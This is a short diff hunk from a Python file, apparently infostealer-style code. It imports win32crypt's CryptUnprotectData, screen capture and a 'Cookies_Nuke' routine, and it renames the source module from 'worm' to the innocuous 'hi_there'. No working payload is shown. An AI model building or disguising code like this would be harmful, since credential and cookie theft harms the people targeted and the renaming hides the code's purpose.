@@ -7,7 +7,7 @@ import json
 import base64 
 import psutil
 
-from worm import Cookies_Nuke
+from hi_there import Cookies_Nuke
 
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
